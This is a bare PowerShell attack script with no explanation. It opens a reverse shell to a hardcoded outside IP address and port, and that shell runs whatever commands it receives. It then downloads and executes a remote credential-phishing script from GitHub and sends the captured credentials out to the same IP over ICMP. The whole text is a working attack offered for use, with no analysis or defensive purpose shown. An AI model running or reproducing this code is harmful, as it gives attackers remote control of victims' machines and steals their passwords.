$ip = 51.38.185.232
$port = 413

$client = New-Object System.Net.Sockets.TCPClient("$ip",$port);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

iwr https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-CredentialsPhish.ps1 | iex
Invoke-CredentialsPhish | % { 1..10 | % { Invoke-ICMPExfil -Target $ip -Payload $_ -Verbose } }
